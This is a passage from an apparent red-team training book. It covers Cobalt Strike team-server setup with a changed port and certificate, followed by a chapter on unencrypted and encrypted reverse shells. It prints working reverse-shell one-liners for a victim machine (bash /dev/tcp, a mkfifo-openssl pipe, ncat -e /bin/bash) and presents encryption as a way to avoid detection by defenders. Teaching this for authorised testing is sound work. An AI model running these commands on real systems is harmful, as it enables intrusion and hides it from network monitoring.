>
> Once this has opened, go to the end of the file and look for the line
> keytool - keystore ./cobaltstrike.store. This line generates an X509
> certificate for SSL use:
>
> ![](media/image254.jpeg)
>
> You should now change the SSL certificate information. By default,
> Cobalt Strike generates the SSL certificate with CN=Major Cobalt
> Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere,
> S=Cyberspace, C=Earth as the SSL information, but you can change this
> to your liking:
>
> ![](media/image255.jpeg)
>
> For now, we have changed this to CN=Evil Corp, OU=IT, O=ECorp,
> L=Atlanta, S=xxx, C=Mars:
>
> ![](media/image256.jpeg)
>
> ![](media/image257.jpeg)You now need to look for the last line, which
> is java -XX:ParallelGCThreads=4, and you should also look for the
> value for -Dcobaltstrike.server_port. Change this to the port you want
> to access the team server at:
As you can see, we have changed this to port 31337 and saved the team
server file:
> ![](media/image258.jpeg)
>
> Using the quick cat command, you can confirm your changes in the team
> server script:
>
> ![](media/image259.jpeg)
As you can see in the following screenshot, the changes are confirmed
and saved properly in the team server script. Now our team server is
ready to roll!
> ![](media/image260.jpeg)
>
> Run the team server using sudo along with the IP and password required
> for authentication:
>
> ![](media/image261.jpeg)
![](media/image262.jpeg)In our previous connection profile, we were
connecting to port 50050 to access the team server, but now we need to
use the port that we changed:
Here, mentioning port 31337 is enough to log in to the team server:
> ![](media/image263.jpeg)
>
> You will be logged in and the Cobalt Strike interface will be
> displayed:
>
> ![](media/image264.jpeg)
# Summary
> This chapter started by exploring the red-team exercise as well as the
> concept of the cyber kill chain, which can be used for an attack plan.
> We then introduced the tool that is used for red-team operations,
> Cobalt Strike. Here, we also covered team servers, the Cobalt Strike
> installation and setup, and finally, the
>
> Cobalt Strike interface. At the end of this chapter, we customized the
> team server script by accessing it on a different port.
In the next chapter, you will read about reverse shell connections and
how you can get them from the compromised server in a secure way so that
the connection is not detected.
# Questions
1.  Is it absolutely necessary to plan the attack? Why not just hack it
    > like we do normally?
2.  Is Cobalt Strike free?
3.  Can we run multiple team servers on the same instance?
4.  My team server\'s fingerprint is different than the one I\'m seeing
    > on the display. What could be the reason for this?
5.  Does Cobalt Strike require the Metasploit framework?
6.  How can we use Cobalt Strike to exploit a system and get access to
    > it?
7.  What else can we customize in the team server script?
# Further reading
> For more information on the topics discussed in this chapter, please
> visit the following links:
>
> **Red Team Operations: Determining a Plan of Attack**:
> [https://www.fireeye.
> com/blog/products-and-services/2016/08/red_team_operations.html](https://www.fireeye.com/blog/products-and-services/2016/08/red_team_operations.html)
>
> **Red-team tools**:
> [http://psos-security.com/red-teaming-a-tool-for-continuous-improv](http://psos-security.com/red-teaming-a-tool-for-continuous-improvement/)
>
> [ement/](http://psos-security.com/red-teaming-a-tool-for-continuous-improvement/)
>
> **Anatomy of a well-run red-team exercise**:
> [https://www.csoonline.com/article/3
> 250249/network-security/anatomy-of-a-well-run-red-team-exercise.html](https://www.csoonline.com/article/3250249/network-security/anatomy-of-a-well-run-red-team-exercise.html)
>
> **redteam-plan**: 
>
> **CobaltStrike**: 
# ./ReverseShell
> In this chapter, we will focus on getting a reverse connection from an
> exploited system. We will also cover different methods for getting a
> secure reverse connection, explaining the difference between a
> non-encrypted and encrypted channel by showing the noise level it
> creates in the network using tcpdump for packet-level analysis.
>
> When penetration testing, it is common to encounter the issue of
> getting a shell. In this case, individuals either upload a web shell
> on the target site and interact with the server or they execute a
> command to get the reverse connection. In both cases, if the scope of
> testing includes internal network recon, then reverse shell connection
> is a must.
>
> For beginners, getting a reverse shell is very interesting. However,
> many of them don\'t realize how careless it is to move forward with
> this without gaining the proper knowledge first. This carelessness
> could cause their web shell to be deleted from the server, or worse,
> the vulnerability that let them upload the web shell onto the server
> could get patched. This is what differentiates a red-team engagement
> from penetration testing. Unless you\'re able to answer all of the
> following questions with a yes, proceed with *caution*:
>
> Are you getting the reverse shell on common ports (80, 443, 53) or
> have you used any uncommon ports (4444, 1337, 31337, and so on) for
> the connection? Does your reverse shell communicate over an encrypted
> channel?
>
> Did you generate your reverse shell payload from a publically known
> tool, such as Metasploit Framework or Empire? If you did, have you
> used any obfuscation or encoding on the payload?
>
> In a red-team engagement, the objective is to get a stealthy reverse
> shell connection so that the defenders of the organization can\'t
> detect our presence in the network. Before using a weapon, always make
> sure that you understand the weapon first; that is, you need to
> understand what exactly a reverse connection and a reverse shell
> connection is.
>
> In this chapter, we will cover the following topics:
>
> Introduction to reverse connections Introduction to reverse shell
> connections
>
> Plain versus encrypted reverse shells
> (netcat/powercat/ncat/socat/cryptcat)
>
> \* reverse_tcp versus reverse_https reverse_https with custom SSL
> certificate meterpreter over ngrok
>
> Quick cheat sheet for reverse shells
# Technical requirement
> Metasploit Framework
>
> netcat, socat, cryptcat, powercat ngrok
# Introduction to reverse connections
> When the user connects to a server, the user binds its socket with the
> server\'s port. This is called a **bind connection**. Bind connections
> are only possible if incoming connections are allowed by the firewall.
> In a situation in which incoming connections are restricted, a user
> can ask the server to connect back. Firewalls generally restrict
> incoming connections but don\'t restrict outgoing connections. When
> the server makes an outgoing connection to the user, this is called a
> **reverse connection**.
# Unencrypted reverse connections using netcat
> Reverse connections can be initiated over an unencrypted channel or an
> encrypted one. To understand reverse connections, let\'s use a tool
> called netcat.
>
> We started the listener on port 8080 and checked whether or not the
> port was in the LISTEN state by using the following command:
>
> ![](media/image265.jpeg)**nc -lv 8080**
>
> **netstat -an \| grep 8080**
>
> The -b option is intended for the interface to listen on. This option
> is only available on a few versions of netcat.
>
> Let\'s start tcpdump on port 8080. tcpdump will help us analyze
> network packets on the wire. To start tcpdump, run the following
> command: **sudo tcpdump -XX -i lo0 port 8080 (-i is used to capture
> packets on localhost interface)**
>
> ![](media/image266.jpeg)
>
> Now let\'s wait for the client to connect to our netcat server:
>
> ![](media/image267.jpeg)
>
> Now that the connection has been established, let\'s try sending some
> sensitive information. In this case, I\'m sending the passcode EX812
> to Himanshu:
>
> ![](media/image268.jpeg)
>
> Due to the unencrypted nature of this connection, tcpdump was able to
> sniff the passcode easily. Can we send this critical information over
> an encrypted channel? Yes, we can!
# Encrypted reverse connections using OpenSSL
> To encrypt our communication, we will use SSL here. To do that, we
> first need to generate an SSL certificate. We can generate a custom
> SSL certificate using
>
> the following command: **openssl req -x509 -newkey rsa:4096 -keyout
> key.pem**
## -out cert.pem -days 365 -nodes
> **req -x509 → requests from openssl to generate X.509 certificate
> -newkey rsa:4096 → generate new keys with size 4096 using RSA -keyout
> key.pem → saves the keys in key.pem file -out cert.pem → saves the
> certificate in cert.pem file -days 365 → certificate valid for 365
> days**
>
> ![](media/image269.jpeg)
>
> The nodes command is not nodes; it\'s no DES. This refers to the fact
> that the private key will not be encrypted and saved in the PKCS#12
> file. Without this option, the private key will be encrypted with
> 3DES-CBC.
>
> Now that the certificate has been generated, let\'s start our server
> to listen for incoming connections on port 8080. This can be achieved
> using the following command: **openssl s_server -quiet -key key.pem
> -cert cert.pem -port 8080**
>
> ![](media/image270.jpeg)
>
> The following commands are defined as follows:
>
> s_server: This starts a generic SSL/TLS server which accepts incoming
> connections
>
> -quiet: No server output
>
> -key: Private key generated
>
> -cert: X.509 certificate
>
> -port: Listening for SSL connections on port 8080
>
> Let\'s try to connect the client with the server and send the
> passcode. The client can connect with the openssl server using the
> following command:
>
> **openssl s_client -quiet -connect \:\**
>
> ![](media/image271.jpeg)
>
> As we can see in the tcpdump Terminal, the passcode sent over the wire
> is now encrypted. This can be used to get an encrypted reverse shell.
> But before that, we should understand the concept of reverse shell
> connections.
# Introduction to reverse shell connections
> ![](media/image272.jpeg)A reverse shell is a type of shell in which
> the target server connects back to the attacker machine. For example,
> an attacker finds a target server with port 21/tcp, 80/tcp and 443/tcp
> in OPEN state and the FTP service running on port 21/tcp is
> vulnerable. Let\'s say an attacker exploits this port in order to open
> another port 1337/tcp on the target server for shell connection, as
> shown in the following diagram:
>
> Credit goes to https://creately.com/ for network architectural
> diagrams
>
> The problem arises when the attacker tries to connect to the target
> server on port 1337/tcp. The attacker is not able to connect to port
> 1337/tcp. Why? Because the firewall blocked that port. The firewall
> can only allow port 21/tcp, 80/tcp and 443/tcp for incoming
> connections and it will block all other ports, as shown in the
> following diagram:
>
> ![](media/image273.jpeg)
>
> This is a typical case scenario of a failed attempt at a bind shell
> connection. In this situation, the attacker needs to understand the
> firewall rules and find a workaround to get the shell connection. So,
> what if the attacker uses a port allowed from the firewall? If the
> attacker uses any one of the available ports, 21/tcp, 80/tcp or
> 443/tcp, will it be possible to get a shell connection? Let\'s say the
> attacker exploits the FTP service to open port 80/tcp; will that work?
> The answer here is no. This won\'t work because the allowed ports from
> the firewall are already in use by the target server and if the
> attacker tries to use port 80/tcp, a port already in use error will be
> thrown, as seen in the following diagram:
>
> ![](media/image274.jpeg)
![](media/image275.jpeg)A solution to this problem is to let the target
server connect back to you instead. If the attacker cannot open port
21/tcp, 80/tcp, or 443/tcp on the target server, they can open the same
port on their machine instead. This way, the target server can connect
back to the attacker machine on port 21/tcp, 80/tcp, or 443/tcp, which
the firewall already allows:
> Now that we have a clear understanding of reverse shell connections,
> let\'s try to get a reverse shell using netcat. Remember: the
> communication will not be encrypted.
# Unencrypted reverse shell using netcat
> Let\'s start a listener on the attacker machine. This can be achieved
> by executing the following command:
>
> ![](media/image276.jpeg)**nc -b \ -lv \**
>
> Our listener is ready for incoming connections on port 8080.
Now let\'s execute the following command on the victim machine:
> ![](media/image277.jpeg)**Bash -i\>& /dev/tcp/192.168.2.6/8080 0\>&1**
>
> Upon successful execution, the victim machine connects back to the
> attacker machine, opening a bash shell:
>
> ![](media/image278.jpeg)
Now let\'s see what happens when the attacker executes basic commands,
such as
> whoami and id:
>
> ![](media/image279.jpeg)
The id command sent over the wire is displayed in plain text. The output
of this command is unencrypted as well:
> ![](media/image280.jpeg)
>
> This is the same case with the whoami command and its result. The
> output is unencrypted:
>
> ![](media/image281.jpeg)
>
> What could go wrong here? A network administrator who monitors the
> organization\'s network can detect our presence in the network with
> this.
>
> So, we go **ninja** here by encrypting the reverse shell for encrypted
> communications. All hail OpenSSL!
# Encrypted reverse shell for \*nix with OpenSSL packages installed
> Assuming that we have already generated a custom X.509 certificate, we
> can execute the following command on the attacker machine to listen
> for an incoming reverse shell connection on port 8080:
>
> ![](media/image282.jpeg)**openssl s_server -quiet -key key.pem -cert
> cert.pem -port 8080**
>
> Now let\'s execute the following command on the victim machine for a
> reverse shell connection:
>
> ![](media/image283.jpeg)**mkfifo /tmp/z; /bin/bash -i \&1
> \| openssl s_client -quiet -connect 192.168.2.6**
>
> Upon successful execution, the attacker machine will get the following
> reverse shell:
>
> ![](media/image284.jpeg)
Let\'s try to execute the id and whoami command now:
> ![](media/image285.jpeg)
>
> Encrypted! \*Dab\*
>
> In cases in which we don\'t have the openssl package installed on the
> client, we can always use different tools. Let\'s try to get reverse
> shells using other tools.
# Encrypted reverse shell using ncat
> Ncat is a Swiss Army Knife tool just like netcat. It is provided by
> Nmap with some extra features, such as proxy connections, universal OS
> support, encrypted connections over SSL, and many more.
>
> Let\'s execute the following command on the attacker machine to listen
> for incoming encrypted connections on port 8080:
>
> ![](media/image286.png)**ncat -l 8080 \--ssl -v**
Now that the listener is ready, let\'s execute the following command on
the victim machine:
> **ncat 192.168.0.110 8080 \--ssl -e /bin/bash -v**
![](media/image60.png)
> *We did not provide any SSL certificate to ncat here. Consequently,
> ncat uses the default SSL certificate for communication.*
>
> We have got the reverse shell! Now let\'s execute the id command:
>
> ![](media/image288.png)